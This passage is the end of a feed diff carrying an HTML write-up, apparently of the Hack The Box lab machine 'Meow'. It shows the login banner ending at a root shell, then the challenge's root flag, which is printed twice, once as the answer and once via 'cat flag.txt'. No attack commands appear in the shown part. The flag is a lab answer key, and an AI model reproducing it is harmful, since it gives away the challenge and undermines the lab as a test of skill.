+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>   https://ubuntu.com/blog/microk8s-memory-optimisation
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span><span style="color:#fab387">75</span> updates can be applied immediately.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span><span style="color:#fab387">31</span> of these updates are standard security updates.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>To see these additional updates run: apt list --upgradable
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">38</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">39</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">40</span><span>The list of available updates is more than a week old.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">41</span><span>To check <span style="color:#cba6f7">for</span> new updates run: sudo apt update
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">42</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">43</span><span>Last login: Mon Sep  <span style="color:#fab387">6</span> 15:15:23 UTC <span style="color:#fab387">2021</span> from 10.10.14.18 on pts/0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">44</span><span>root@Meow:~#</span></span></code></pre></div>
+</br>
+<h5 id="submit-flag">SUBMIT FLAG</h5>
+<p>Submit root flag</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>b40abdfe23665f766f9c61ecba8a4c19</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@Meow:~# ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>flag.txt snap
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>root@Meow:~# cat flag.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>b40abdfe23665f766f9c61ecba8a4c19
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>root@Meow:~#</span></span></code></pre></div>
+<p><img src="./htb_meow.png" alt="meow_clear"></p>
 ]]></content:encoded>
     </item>
   </channel>
